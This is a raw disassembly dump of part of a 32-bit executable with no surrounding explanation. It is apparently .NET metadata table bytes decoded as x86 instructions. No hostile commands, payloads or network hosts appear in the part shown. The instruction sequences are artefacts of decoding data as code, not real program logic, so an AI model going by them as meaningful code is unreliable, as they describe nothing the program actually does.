  405ccf:	1d dc 13 3d 00       	sbb    $0x3d13dc,%eax
  405cd4:	36 00 8d 00 81 01 10 	add    %cl,%ss:0x10018100(%ebp)
  405cdb:	00 50 19             	add    %dl,0x19(%eax)
  405cde:	32 19                	xor    (%ecx),%bl
  405ce0:	3d 00 37 00 92       	cmp    $0x92003700,%eax
  405ce5:	00 01                	add    %al,(%ecx)
  405ce7:	00 10                	add    %dl,(%eax)
  405ce9:	00 0d 01 89 0f 3d    	add    %cl,0x3d0f8901
  405cef:	00 38                	add    %bh,(%eax)
  405cf1:	00 97 00 81 01 10    	add    %dl,0x10018100(%edi)
  405cf7:	00 06                	add    %al,(%esi)
  405cf9:	01 89 0f 3d 00 3f    	add    %ecx,0x3f003d0f(%ecx)
  405cff:	00 9e 00 81 01 10    	add    %bl,0x10018100(%esi)
  405d05:	00 28                	add    %ch,(%eax)
  405d07:	12 89 0f 3d 00 3f    	adc    0x3f003d0f(%ecx),%cl
  405d0d:	00 a0 00 00 01 00    	add    %ah,0x10000(%eax)
  405d13:	00 49 01             	add    %cl,0x1(%ecx)
  405d16:	00 00                	add    %al,(%eax)
  405d18:	3d 00 3f 00 a2       	cmp    $0xa2003f00,%eax
  405d1d:	00 02                	add    %al,(%edx)
  405d1f:	01 00                	add    %eax,(%eax)
  405d21:	00 f2                	add    %dh,%dl
  405d23:	01 00                	add    %eax,(%eax)
  405d25:	00 a1 00 41 00 a2    	add    %ah,-0x5dffbf00(%ecx)
  405d2b:	00 83 01 10 00 80    	add    %al,-0x7fffefff(%ebx)
  405d31:	00 00                	add    %al,(%eax)
  405d33:	00 3d 00 45 00 a2    	add    %bh,0xa2004500
  405d39:	00 13                	add    %dl,(%ebx)
  405d3b:	01 00                	add    %eax,(%eax)
  405d3d:	00 1b                	add    %bl,(%ebx)
  405d3f:	01 00                	add    %eax,(%eax)
  405d41:	00 fd                	add    %bh,%ch
  405d43:	00 46 00             	add    %al,0x0(%esi)
  405d46:	a2 00 13 01 00       	mov    %al,0x11300
  405d4b:	00 38                	add    %bh,(%eax)
  405d4d:	00 00                	add    %al,(%eax)
  405d4f:	00 fd                	add    %bh,%ch
  405d51:	00 46 00             	add    %al,0x0(%esi)
  405d54:	a2 00 16 00 5e       	mov    %al,0x5e001600
  405d59:	18 cb                	sbb    %cl,%bl
  405d5b:	06                   	push   %es
  405d5c:	16                   	push   %ss
  405d5d:	00 6b 18             	add    %ch,0x18(%ebx)
  405d60:	cb                   	lret
  405d61:	06                   	push   %es
  405d62:	16                   	push   %ss
  405d63:	00 9a 10 cb 06 16    	add    %bl,0x1606cb10(%edx)
  405d69:	00 ac 0e cb 06 16 00 	add    %ch,0x1606cb(%esi,%ecx,1)
  405d70:	d3 12                	rcll   %cl,(%edx)
  405d72:	cb                   	lret
  405d73:	06                   	push   %es
  405d74:	16                   	push   %ss
  405d75:	00 20                	add    %ah,(%eax)
  405d77:	06                   	push   %es
  405d78:	cb                   	lret
  405d79:	06                   	push   %es
  405d7a:	16                   	push   %ss
  405d7b:	00 93 1c cb 06 16    	add    %dl,0x1606cb1c(%ebx)
  405d81:	00 88 02 cb 06 16    	add    %cl,0x1606cb02(%eax)
  405d87:	00 66 08             	add    %ah,0x8(%esi)
  405d8a:	cb                   	lret
  405d8b:	06                   	push   %es
  405d8c:	16                   	push   %ss
  405d8d:	00 19                	add    %bl,(%ecx)
  405d8f:	08 cb                	or     %cl,%bl
  405d91:	06                   	push   %es
  405d92:	16                   	push   %ss
  405d93:	00 60 08             	add    %ah,0x8(%eax)
  405d96:	ce                   	into
  405d97:	06                   	push   %es
  405d98:	16                   	push   %ss
  405d99:	00 4a 0d             	add    %cl,0xd(%edx)
  405d9c:	cb                   	lret
  405d9d:	06                   	push   %es
  405d9e:	16                   	push   %ss
  405d9f:	00 14 01             	add    %dl,(%ecx,%eax,1)
  405da2:	d2 06                	rolb   %cl,(%esi)
  405da4:	16                   	push   %ss
  405da5:	00 62 10             	add    %ah,0x10(%edx)
  405da8:	cb                   	lret
  405da9:	06                   	push   %es
  405daa:	16                   	push   %ss
  405dab:	00 5c 02 cb          	add    %bl,-0x35(%edx,%eax,1)
  405daf:	06                   	push   %es
  405db0:	16                   	push   %ss
  405db1:	00 71 03             	add    %dh,0x3(%ecx)
  405db4:	cb                   	lret
  405db5:	06                   	push   %es
  405db6:	16                   	push   %ss
  405db7:	00 e8                	add    %ch,%al
  405db9:	1b cb                	sbb    %ebx,%ecx
  405dbb:	06                   	push   %es
  405dbc:	11 00                	adc    %eax,(%eax)
  405dbe:	5f                   	pop    %edi
  405dbf:	04 d6                	add    $0xd6,%al
  405dc1:	06                   	push   %es
  405dc2:	11 00                	adc    %eax,(%eax)
  405dc4:	44                   	inc    %esp
  405dc5:	04 da                	add    $0xda,%al
  405dc7:	06                   	push   %es
  405dc8:	11 00                	adc    %eax,(%eax)
  405dca:	14 04                	adc    $0x4,%al
  405dcc:	de 06                	fiadds (%esi)
  405dce:	11 00                	adc    %eax,(%eax)
  405dd0:	c8 03 e2 06          	enter  $0xe203,$0x6
  405dd4:	11 00                	adc    %eax,(%eax)
  405dd6:	2c 04                	sub    $0x4,%al
  405dd8:	e2 06                	loop   0x405de0
  405dda:	11 00                	adc    %eax,(%eax)
  405ddc:	ad                   	lods   %ds:(%esi),%eax
  405ddd:	03 e5                	add    %ebp,%esp
  405ddf:	06                   	push   %es
  405de0:	11 00                	adc    %eax,(%eax)
  405de2:	90                   	nop
  405de3:	03 e9                	add    %ecx,%ebp
  405de5:	06                   	push   %es
  405de6:	31 00                	xor    %eax,(%eax)
  405de8:	76 03                	jbe    0x405ded
  405dea:	ec                   	in     (%dx),%al
  405deb:	06                   	push   %es
  405dec:	11 00                	adc    %eax,(%eax)
  405dee:	e4 03                	in     $0x3,%al
  405df0:	e5 06                	in     $0x6,%eax
  405df2:	11 00                	adc    %eax,(%eax)
  405df4:	fa                   	cli
  405df5:	03 ef                	add    %edi,%ebp
  405df7:	06                   	push   %es
  405df8:	11 00                	adc    %eax,(%eax)
  405dfa:	37                   	aaa
  405dfb:	05 f2 06 01 00       	add    $0x106f2,%eax
  405e00:	28 10                	sub    %dl,(%eax)
  405e02:	f6 06 01             	testb  $0x1,(%esi)
  405e05:	00 49 11             	add    %cl,0x11(%ecx)
  405e08:	ef                   	out    %eax,(%dx)
  405e09:	06                   	push   %es
  405e0a:	01 00                	add    %eax,(%eax)
  405e0c:	28 10                	sub    %dl,(%eax)
  405e0e:	f6 06 01             	testb  $0x1,(%esi)
  405e11:	00 d6                	add    %dl,%dh
  405e13:	13 ff                	adc    %edi,%edi
  405e15:	06                   	push   %es
  405e16:	01 00                	add    %eax,(%eax)
  405e18:	5e                   	pop    %esi
  405e19:	07                   	pop    %es
  405e1a:	cb                   	lret
  405e1b:	06                   	push   %es
  405e1c:	01 00                	add    %eax,(%eax)
  405e1e:	3e 07                	ds pop %es
  405e20:	cb                   	lret
  405e21:	06                   	push   %es
  405e22:	01 00                	add    %eax,(%eax)
  405e24:	6f                   	outsl  %ds:(%esi),(%dx)
  405e25:	0a ec                	or     %ah,%ch
  405e27:	06                   	push   %es
  405e28:	01 00                	add    %eax,(%eax)
  405e2a:	cd 07                	int    $0x7
  405e2c:	03 07                	add    (%edi),%eax
  405e2e:	01 00                	add    %eax,(%eax)
  405e30:	69 1a ff 06 01 00    	imul   $0x106ff,(%edx),%ebx
  405e36:	28 10                	sub    %dl,(%eax)
  405e38:	f6 06 01             	testb  $0x1,(%esi)
  405e3b:	00 2a                	add    %ch,(%edx)
  405e3d:	1c 07                	sbb    $0x7,%al
  405e3f:	07                   	pop    %es
  405e40:	06                   	push   %es
  405e41:	06                   	push   %es
  405e42:	8c 02                	mov    %es,(%edx)
  405e44:	ef                   	out    %eax,(%dx)
  405e45:	06                   	push   %es
  405e46:	56                   	push   %esi
  405e47:	80 91 11 03 07 56 80 	adcb   $0x80,0x56070311(%ecx)
  405e4e:	e4 0e                	in     $0xe,%al
  405e50:	03 07                	add    (%edi),%eax
  405e52:	56                   	push   %esi
  405e53:	80 17 12             	adcb   $0x12,(%edi)
  405e56:	03 07                	add    (%edi),%eax
  405e58:	56                   	push   %esi
  405e59:	80 2f 1c             	subb   $0x1c,(%edi)
  405e5c:	03 07                	add    (%edi),%eax
  405e5e:	56                   	push   %esi
  405e5f:	80 87 0c 03 07 56 80 	addb   $0x80,0x5607030c(%edi)
  405e66:	7b 13                	jnp    0x405e7b
  405e68:	03 07                	add    (%edi),%eax
  405e6a:	56                   	push   %esi
  405e6b:	80 c7 00             	add    $0x0,%bh
  405e6e:	03 07                	add    (%edi),%eax
  405e70:	56                   	push   %esi
  405e71:	80 14 10 03          	adcb   $0x3,(%eax,%edx,1)
  405e75:	07                   	pop    %es
  405e76:	56                   	push   %esi
  405e77:	80 c8 18             	or     $0x18,%al
  405e7a:	03 07                	add    (%edi),%eax
  405e7c:	56                   	push   %esi
  405e7d:	80 19 06             	sbbb   $0x6,(%ecx)
  405e80:	03 07                	add    (%edi),%eax
  405e82:	56                   	push   %esi
  405e83:	80 63 07 03          	andb   $0x3,0x7(%ebx)
  405e87:	07                   	pop    %es
  405e88:	56                   	push   %esi
  405e89:	80 e8 1c             	sub    $0x1c,%al
  405e8c:	03 07                	add    (%edi),%eax
  405e8e:	16                   	push   %ss
  405e8f:	00 2c 12             	add    %ch,(%edx,%edx,1)
  405e92:	0b 07                	or     (%edi),%eax
  405e94:	31 00                	xor    %eax,(%eax)
  405e96:	ef                   	out    %eax,(%dx)
  405e97:	01 cb                	add    %ecx,%ebx
  405e99:	06                   	push   %es
  405e9a:	16                   	push   %ss
  405e9b:	00 fa                	add    %bh,%dl
  405e9d:	16                   	push   %ss
  405e9e:	f6 06 51             	testb  $0x51,(%esi)
  405ea1:	80 3c 0d ef 06 51 80 	cmpb   $0x38,-0x7faef911(,%ecx,1)
  405ea8:	38 
  405ea9:	0d ef 06 51 80       	or     $0x805106ef,%eax
  405eae:	2f                   	das
  405eaf:	0d ef 06 51 80       	or     $0x805106ef,%eax
  405eb4:	13 0d ef 06 21 00    	adc    0x2106ef,%ecx
  405eba:	97                   	xchg   %eax,%edi
  405ebb:	1c de                	sbb    $0xde,%al
  405ebd:	06                   	push   %es
  405ebe:	21 00                	and    %eax,(%eax)
  405ec0:	78 1c                	js     0x405ede
  405ec2:	de 06                	fiadds (%esi)
  405ec4:	31 00                	xor    %eax,(%eax)
  405ec6:	b0 19                	mov    $0x19,%al
  405ec8:	de 06                	fiadds (%esi)
  405eca:	33 01                	xor    (%ecx),%eax
  405ecc:	68 01 10 07 33       	push   $0x33071001
  405ed1:	01 02                	add    %eax,(%edx)
  405ed3:	02 14 07             	add    (%edi,%eax,1),%dl
  405ed6:	06                   	push   %es
  405ed7:	06                   	push   %es
  405ed8:	8c 02                	mov    %es,(%edx)
  405eda:	18 07                	sbb    %al,(%edi)
  405edc:	56                   	push   %esi
  405edd:	80 61 02 1b          	andb   $0x1b,0x2(%ecx)
  405ee1:	07                   	pop    %es
  405ee2:	56                   	push   %esi
  405ee3:	80 bf 01 1b 07 56 80 	cmpb   $0x80,0x56071b01(%edi)
  405eea:	ac                   	lods   %ds:(%esi),%al
  405eeb:	01 1b                	add    %ebx,(%ebx)
  405eed:	07                   	pop    %es
  405eee:	16                   	push   %ss
  405eef:	00 0b                	add    %cl,(%ebx)
  405ef1:	00 1f                	add    %bl,(%edi)
  405ef3:	07                   	pop    %es
  405ef4:	50                   	push   %eax
  405ef5:	20 00                	and    %al,(%eax)
  405ef7:	00 00                	add    %al,(%eax)
  405ef9:	00 96 00 31 10 8e    	add    %dl,-0x71efcf00(%esi)
  405eff:	01 01                	add    %eax,(%ecx)
  405f01:	00 24 21             	add    %ah,(%ecx,%eiz,1)
  405f04:	00 00                	add    %al,(%eax)
  405f06:	00 00                	add    %al,(%eax)
  405f08:	86 18                	xchg   %bl,(%eax)
  405f0a:	a8 14                	test   $0x14,%al
  405f0c:	06                   	push   %es
  405f0d:	00 01                	add    %al,(%ecx)
  405f0f:	00 2c 21             	add    %ch,(%ecx,%eiz,1)
  405f12:	00 00                	add    %al,(%eax)
  405f14:	00 00                	add    %al,(%eax)
  405f16:	96                   	xchg   %eax,%esi
  405f17:	00 b2 16 30 04 01    	add    %dh,0x1043016(%edx)
  405f1d:	00 68 22             	add    %ch,0x22(%eax)
  405f20:	00 00                	add    %al,(%eax)
  405f22:	00 00                	add    %al,(%eax)
  405f24:	91                   	xchg   %eax,%ecx
  405f25:	00 de                	add    %bl,%dh
  405f27:	0c 30                	or     $0x30,%al
  405f29:	04 01                	add    $0x1,%al
  405f2b:	00 d0                	add    %dl,%al
  405f2d:	22 00                	and    (%eax),%al
  405f2f:	00 00                	add    %al,(%eax)
  405f31:	00 91 18 ae 14 8e    	add    %dl,-0x71eb51e8(%ecx)
  405f37:	01 01                	add    %eax,(%ecx)
  405f39:	00 73 23             	add    %dh,0x23(%ebx)
  405f3c:	00 00                	add    %al,(%eax)
  405f3e:	00 00                	add    %al,(%eax)
  405f40:	96                   	xchg   %eax,%esi
  405f41:	08 1a                	or     %bl,(%edx)
  405f43:	1a 3c 07             	sbb    (%edi,%eax,1),%bh
  405f46:	01 00                	add    %eax,(%eax)
  405f48:	7a 23                	jp     0x405f6d
  405f4a:	00 00                	add    %al,(%eax)
  405f4c:	00 00                	add    %al,(%eax)
  405f4e:	96                   	xchg   %eax,%esi
  405f4f:	08 28                	or     %ch,(%eax)
  405f51:	1a 41 07             	sbb    0x7(%ecx),%al
  405f54:	01 00                	add    %eax,(%eax)
  405f56:	82 23 00             	andb   $0x0,(%ebx)
  405f59:	00 00                	add    %al,(%eax)
  405f5b:	00 96 08 fe 19 47    	add    %dl,0x4719fe08(%esi)
  405f61:	07                   	pop    %es
  405f62:	02 00                	add    (%eax),%al
  405f64:	89 23                	mov    %esp,(%ebx)
  405f66:	00 00                	add    %al,(%eax)
  405f68:	00 00                	add    %al,(%eax)
  405f6a:	96                   	xchg   %eax,%esi
  405f6b:	08 0c 1a             	or     %cl,(%edx,%ebx,1)
  405f6e:	4c                   	dec    %esp
  405f6f:	07                   	pop    %es
  405f70:	02 00                	add    (%eax),%al
  405f72:	91                   	xchg   %eax,%ecx
  405f73:	23 00                	and    (%eax),%eax
  405f75:	00 00                	add    %al,(%eax)
  405f77:	00 91 08 2a 13 52    	add    %dl,0x52132a08(%ecx)
  405f7d:	07                   	pop    %es
  405f7e:	03 00                	add    (%eax),%eax
  405f80:	98                   	cwtl
  405f81:	23 00                	and    (%eax),%eax
  405f83:	00 00                	add    %al,(%eax)
  405f85:	00 91 08 35 13 57    	add    %dl,0x57133508(%ecx)
  405f8b:	07                   	pop    %es
  405f8c:	03 00                	add    (%eax),%eax
  405f8e:	a0 23 00 00 00       	mov    0x23,%al
  405f93:	00 91 08 da 0a 5d    	add    %dl,0x5d0ada08(%ecx)
  405f99:	07                   	pop    %es
  405f9a:	04 00                	add    $0x0,%al
  405f9c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405f9d:	23 00                	and    (%eax),%eax
  405f9f:	00 00                	add    %al,(%eax)
  405fa1:	00 91 08 e9 0a 61    	add    %dl,0x610ae908(%ecx)
  405fa7:	07                   	pop    %es
  405fa8:	04 00                	add    $0x0,%al
  405faa:	af                   	scas   %es:(%edi),%eax
  405fab:	23 00                	and    (%eax),%eax
  405fad:	00 00                	add    %al,(%eax)
  405faf:	00 91 08 89 19 5d    	add    %dl,0x5d198908(%ecx)
  405fb5:	07                   	pop    %es
  405fb6:	05 00 b6 23 00       	add    $0x23b600,%eax
  405fbb:	00 00                	add    %al,(%eax)
  405fbd:	00 91 08 94 19 61    	add    %dl,0x61199408(%ecx)
  405fc3:	07                   	pop    %es
  405fc4:	05 00 be 23 00       	add    $0x23be00,%eax
  405fc9:	00 00                	add    %al,(%eax)
  405fcb:	00 91 08 92 0a 66    	add    %dl,0x660a9208(%ecx)
  405fd1:	07                   	pop    %es
  405fd2:	06                   	push   %es
  405fd3:	00 c5                	add    %al,%ch
  405fd5:	23 00                	and    (%eax),%eax
  405fd7:	00 00                	add    %al,(%eax)
  405fd9:	00 91 08 a0 0a 6b    	add    %dl,0x6b0aa008(%ecx)
  405fdf:	07                   	pop    %es
  405fe0:	06                   	push   %es
  405fe1:	00 cd                	add    %cl,%ch
  405fe3:	23 00                	and    (%eax),%eax
  405fe5:	00 00                	add    %al,(%eax)
  405fe7:	00 96 08 3f 03 30    	add    %dl,0x30033f08(%esi)
  405fed:	04 07                	add    $0x7,%al
  405fef:	00 d4                	add    %dl,%ah
  405ff1:	23 00                	and    (%eax),%eax
  405ff3:	00 00                	add    %al,(%eax)
  405ff5:	00 96 08 4f 03 71    	add    %dl,0x71034f08(%esi)
  405ffb:	07                   	pop    %es
  405ffc:	07                   	pop    %es
  405ffd:	00 dc                	add    %bl,%ah
  405fff:	23 00                	and    (%eax),%eax
  406001:	00 00                	add    %al,(%eax)
  406003:	00 91 08 e8 02 76    	add    %dl,0x7602e808(%ecx)
  406009:	07                   	pop    %es
  40600a:	08 00                	or     %al,(%eax)
  40600c:	e3 23                	jecxz  0x406031
  40600e:	00 00                	add    %al,(%eax)
  406010:	00 00                	add    %al,(%eax)
  406012:	91                   	xchg   %eax,%ecx
  406013:	08 4a 0b             	or     %cl,0xb(%edx)
  406016:	66 07                	popw   %es
  406018:	08 00                	or     %al,(%eax)
  40601a:	ea 23 00 00 00 00 91 	ljmp   $0x9100,$0x23
  406021:	08 53 0b             	or     %dl,0xb(%ebx)
  406024:	6b 07 08             	imul   $0x8,(%edi),%eax
  406027:	00 f2                	add    %dh,%dl
  406029:	23 00                	and    (%eax),%eax
  40602b:	00 00                	add    %al,(%eax)
  40602d:	00 96 08 8b 0e fb    	add    %dl,-0x4f174f8(%esi)
  406033:	03 09                	add    (%ecx),%ecx
  406035:	00 f9                	add    %bh,%cl
  406037:	23 00                	and    (%eax),%eax
  406039:	00 00                	add    %al,(%eax)
  40603b:	00 96 08 98 0e 2c    	add    %dl,0x2c0e9808(%esi)
  406041:	00 09                	add    %cl,(%ecx)
  406043:	00 04 24             	add    %al,(%esp)
  406046:	00 00                	add    %al,(%eax)
  406048:	00 00                	add    %al,(%eax)
  40604a:	96                   	xchg   %eax,%esi
  40604b:	00 ed                	add    %ch,%ch
  40604d:	19 8e 01 0a 00 fc    	sbb    %ecx,-0x3fff5ff(%esi)
  406053:	26 00 00             	add    %al,%es:(%eax)
  406056:	00 00                	add    %al,(%eax)
  406058:	91                   	xchg   %eax,%ecx
  406059:	00 1f                	add    %bl,(%edi)
  40605b:	07                   	pop    %es
  40605c:	36 00 0a             	add    %cl,%ss:(%edx)
  40605f:	00 07                	add    %al,(%edi)
  406061:	27                   	daa
  406062:	00 00                	add    %al,(%eax)
  406064:	00 00                	add    %al,(%eax)
  406066:	91                   	xchg   %eax,%ecx
  406067:	00 58 08             	add    %bl,0x8(%eax)
  40606a:	7a 07                	jp     0x406073
  40606c:	0b 00                	or     (%eax),%eax
  40606e:	14 27                	adc    $0x27,%al
  406070:	00 00                	add    %al,(%eax)
  406072:	00 00                	add    %al,(%eax)
  406074:	96                   	xchg   %eax,%esi
  406075:	00 0e                	add    %cl,(%esi)
  406077:	19 8e 01 0f 00 78    	sbb    %ecx,0x78000f01(%esi)
  40607d:	27                   	daa
  40607e:	00 00                	add    %al,(%eax)
  406080:	00 00                	add    %al,(%eax)
  406082:	96                   	xchg   %eax,%esi
  406083:	00 94 02 85 07 0f 00 	add    %dl,0xf0785(%edx,%eax,1)
  40608a:	38 29                	cmp    %ch,(%ecx)
  40608c:	00 00                	add    %al,(%eax)
  40608e:	00 00                	add    %al,(%eax)
  406090:	96                   	xchg   %eax,%esi
  406091:	00 9e 04 57 07 10    	add    %bl,0x10075704(%esi)
  406097:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  40609b:	00 00                	add    %al,(%eax)
  40609d:	00 96 00 47 19 83    	add    %dl,-0x7ce6b900(%esi)
  4060a3:	01 11                	add    %edx,(%ecx)
  4060a5:	00 e6                	add    %ah,%dh
  4060a7:	2a 00                	sub    (%eax),%al
  4060a9:	00 00                	add    %al,(%eax)
  4060ab:	00 91 00 a7 0c 83    	add    %dl,-0x7cf35900(%ecx)
  4060b1:	01 12                	add    %edx,(%edx)
  4060b3:	00 f4                	add    %dh,%ah
  4060b5:	2a 00                	sub    (%eax),%al
  4060b7:	00 00                	add    %al,(%eax)
  4060b9:	00 91 18 ae 14 8e    	add    %dl,-0x71eb51e8(%ecx)
  4060bf:	01 13                	add    %edx,(%ebx)
  4060c1:	00 00                	add    %al,(%eax)
  4060c3:	2b 00                	sub    (%eax),%eax
  4060c5:	00 00                	add    %al,(%eax)
  4060c7:	00 96 00 df 15 4b    	add    %dl,0x4b15df00(%esi)
  4060cd:	00 13                	add    %dl,(%ebx)
  4060cf:	00 0d 2b 00 00 00    	add    %cl,0x2b
  4060d5:	00 96 00 73 0c bb    	add    %dl,-0x44f38d00(%esi)
  4060db:	05 14 00 1c 2b       	add    $0x2b1c0014,%eax
  4060e0:	00 00                	add    %al,(%eax)
  4060e2:	00 00                	add    %al,(%eax)
  4060e4:	96                   	xchg   %eax,%esi
  4060e5:	00 4d 0c             	add    %cl,0xc(%ebp)
  4060e8:	bb 05 15 00 60       	mov    $0x60001505,%ebx
  4060ed:	2b 00                	sub    (%eax),%eax
  4060ef:	00 00                	add    %al,(%eax)
  4060f1:	00 96 00 7d 0c bb    	add    %dl,-0x44f38300(%esi)
  4060f7:	05 16 00 a4 2b       	add    $0x2ba40016,%eax
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	00 00                	add    %al,(%eax)
  406100:	96                   	xchg   %eax,%esi
  406101:	00 26                	add    %ah,(%esi)
  406103:	16                   	push   %ss
  406104:	8b 07                	mov    (%edi),%eax
  406106:	17                   	pop    %ss
  406107:	00 d9                	add    %bl,%cl
  406109:	2b 00                	sub    (%eax),%eax
  40610b:	00 00                	add    %al,(%eax)
  40610d:	00 96 00 d6 00 ae    	add    %dl,-0x51ff2a00(%esi)
  406113:	01 18                	add    %ebx,(%eax)
  406115:	00 e6                	add    %ah,%dh
  406117:	2b 00                	sub    (%eax),%eax
  406119:	00 00                	add    %al,(%eax)
  40611b:	00 96 00 76 00 68    	add    %dl,0x68007600(%esi)
  406121:	01 19                	add    %ebx,(%ecx)
  406123:	00 0a                	add    %cl,(%edx)
  406125:	2c 00                	sub    $0x0,%al
  406127:	00 00                	add    %al,(%eax)
  406129:	00 96 00 f1 00 0f    	add    %dl,0xf00f100(%esi)
  40612f:	02 1a                	add    (%edx),%bl
  406131:	00 1e                	add    %bl,(%esi)
  406133:	2c 00                	sub    $0x0,%al
  406135:	00 00                	add    %al,(%eax)
  406137:	00 96 00 97 05 b4    	add    %dl,-0x4bfa6900(%esi)
  40613d:	01 1b                	add    %ebx,(%ebx)
  40613f:	00 2b                	add    %ch,(%ebx)
  406141:	2c 00                	sub    $0x0,%al
  406143:	00 00                	add    %al,(%eax)
  406145:	00 86 18 a8 14 06    	add    %al,0x614a818(%esi)
  40614b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40614e:	33 2c 00             	xor    (%eax,%eax,1),%ebp
  406151:	00 00                	add    %al,(%eax)
  406153:	00 91 18 ae 14 8e    	add    %dl,-0x71eb51e8(%ecx)
  406159:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40615c:	3f                   	aas
  40615d:	2c 00                	sub    $0x0,%al
  40615f:	00 00                	add    %al,(%eax)
  406161:	00 86 18 a8 14 92    	add    %al,-0x6deb57e8(%esi)
  406167:	07                   	pop    %es
  406168:	1c 00                	sbb    $0x0,%al
  40616a:	55                   	push   %ebp
  40616b:	2c 00                	sub    $0x0,%al
  40616d:	00 00                	add    %al,(%eax)
  40616f:	00 e1                	add    %ah,%cl
  406171:	09 97 1a 1a 00 1d    	or     %edx,0x1d001a1a(%edi)
  406177:	00 68 2c             	add    %ch,0x2c(%eax)
  40617a:	00 00                	add    %al,(%eax)
  40617c:	00 00                	add    %al,(%eax)
  40617e:	e1 01                	loope  0x406181
  406180:	82 1b 1e             	sbbb   $0x1e,(%ebx)
  406183:	00 1d 00 8b 2c 00    	add    %bl,0x2c8b00
  406189:	00 00                	add    %al,(%eax)
  40618b:	00 e1                	add    %ah,%cl
  40618d:	01 64 19 06          	add    %esp,0x6(%ecx,%ebx,1)
  406191:	00 1d 00 94 2c 00    	add    %bl,0x2c9400
  406197:	00 00                	add    %al,(%eax)
  406199:	00 86 18 a8 14 9d    	add    %al,-0x62eb57e8(%esi)
  40619f:	07                   	pop    %es
  4061a0:	1d 00 aa 2c 00       	sbb    $0x2caa00,%eax
  4061a5:	00 00                	add    %al,(%eax)
  4061a7:	00 86 00 1f 03 aa    	add    %al,-0x55fce100(%esi)
  4061ad:	07                   	pop    %es
  4061ae:	1f                   	pop    %ds
  4061af:	00 b7 2c 00 00 00    	add    %dh,0x2c(%edi)
  4061b5:	00 86 00 1f 03 af    	add    %al,-0x50fce100(%esi)
  4061bb:	07                   	pop    %es
  4061bc:	1f                   	pop    %ds
  4061bd:	00 cb                	add    %cl,%bl
  4061bf:	2c 00                	sub    $0x0,%al
  4061c1:	00 00                	add    %al,(%eax)
  4061c3:	00 86 00 1f 03 b5    	add    %al,-0x4afce100(%esi)
  4061c9:	07                   	pop    %es
  4061ca:	20 00                	and    %al,(%eax)
  4061cc:	df 2c 00             	fildll (%eax,%eax,1)
  4061cf:	00 00                	add    %al,(%eax)
  4061d1:	00 86 00 1f 03 bb    	add    %al,-0x44fce100(%esi)
  4061d7:	07                   	pop    %es
  4061d8:	21 00                	and    %eax,(%eax)
  4061da:	f3 2c 00             	repz sub $0x0,%al
  4061dd:	00 00                	add    %al,(%eax)
  4061df:	00 86 08 65 0f c1    	add    %al,-0x3ef09af8(%esi)
  4061e5:	07                   	pop    %es
  4061e6:	22 00                	and    (%eax),%al
  4061e8:	01 2d 00 00 00 00    	add    %ebp,0x0
  4061ee:	86 08                	xchg   %cl,(%eax)
  4061f0:	24 0d                	and    $0xd,%al
  4061f2:	c8 01 23 00          	enter  $0x2301,$0x0
  4061f6:	0e                   	push   %cs
  4061f7:	2d 00 00 00 00       	sub    $0x0,%eax
  4061fc:	81 00 48 07 10 00    	addl   $0x100748,(%eax)
  406202:	23 00                	and    (%eax),%eax
  406204:	28 2d 00 00 00 00    	sub    %ch,0x0
  40620a:	81 00 62 12 06 00    	addl   $0x61262,(%eax)
  406210:	24 00                	and    $0x0,%al
  406212:	68 2d 00 00 00       	push   $0x2d
  406217:	00 81 00 1a 03 aa    	add    %al,-0x55fce600(%ecx)
  40621d:	07                   	pop    %es
  40621e:	24 00                	and    $0x0,%al
  406220:	90                   	nop
  406221:	2d 00 00 00 00       	sub    $0x0,%eax
  406226:	81 00 2d 0b c7 07    	addl   $0x7c70b2d,(%eax)
  40622c:	24 00                	and    $0x0,%al
  40622e:	00 2e                	add    %ch,(%esi)
  406230:	00 00                	add    %al,(%eax)
  406232:	00 00                	add    %al,(%eax)
  406234:	86 00                	xchg   %al,(%eax)
  406236:	ce                   	into
  406237:	18 af 07 25 00 27    	sbb    %ch,0x27002507(%edi)
  40623d:	2e 00 00             	add    %al,%cs:(%eax)
  406240:	00 00                	add    %al,(%eax)
  406242:	81 00 7a 04 aa 07    	addl   $0x7aa047a,(%eax)
  406248:	26 00 45 2e          	add    %al,%es:0x2e(%ebp)
  40624c:	00 00                	add    %al,(%eax)
  40624e:	00 00                	add    %al,(%eax)
  406250:	81 00 8b 04 aa 07    	addl   $0x7aa048b,(%eax)
  406256:	26 00 63 2e          	add    %ah,%es:0x2e(%ebx)
  40625a:	00 00                	add    %al,(%eax)
  40625c:	00 00                	add    %al,(%eax)
  40625e:	86 00                	xchg   %al,(%eax)
  406260:	90                   	nop
  406261:	04 aa                	add    $0xaa,%al
  406263:	07                   	pop    %es
  406264:	26 00 6c 2e 00       	add    %ch,%es:0x0(%esi,%ebp,1)
  406269:	00 00                	add    %al,(%eax)
  40626b:	00 81 00 12 12 cc    	add    %al,-0x33edee00(%ecx)
  406271:	07                   	pop    %es
  406272:	26 00 28             	add    %ch,%es:(%eax)
  406275:	2f                   	das
  406276:	00 00                	add    %al,(%eax)
  406278:	00 00                	add    %al,(%eax)
  40627a:	81 00 ee 1b cc 07    	addl   $0x7cc1bee,(%eax)
  406280:	27                   	daa
  406281:	00 ca                	add    %cl,%dl
  406283:	2f                   	das
  406284:	00 00                	add    %al,(%eax)
  406286:	00 00                	add    %al,(%eax)
  406288:	86 00                	xchg   %al,(%eax)
  40628a:	76 13                	jbe    0x40629f
  40628c:	7e 01                	jle    0x40628f
  40628e:	28 00                	sub    %al,(%eax)
  406290:	df 2f                	fildll (%edi)
  406292:	00 00                	add    %al,(%eax)
  406294:	00 00                	add    %al,(%eax)
  406296:	86 00                	xchg   %al,(%eax)
  406298:	c2 00 d3             	ret    $0xd300
  40629b:	07                   	pop    %es
  40629c:	29 00                	sub    %eax,(%eax)
  40629e:	f4                   	hlt
  40629f:	2f                   	das
  4062a0:	00 00                	add    %al,(%eax)
  4062a2:	00 00                	add    %al,(%eax)
  4062a4:	86 00                	xchg   %al,(%eax)
  4062a6:	b6 00                	mov    $0x0,%dh
  4062a8:	d8 07                	fadds  (%edi)
  4062aa:	2a 00                	sub    (%eax),%al
  4062ac:	98                   	cwtl
  4062ad:	30 00                	xor    %al,(%eax)
  4062af:	00 00                	add    %al,(%eax)
  4062b1:	00 86 00 69 13 68    	add    %al,0x68136900(%esi)
  4062b7:	02 2a                	add    (%edx),%ch
  4062b9:	00 3c 31             	add    %bh,(%ecx,%esi,1)
  4062bc:	00 00                	add    %al,(%eax)
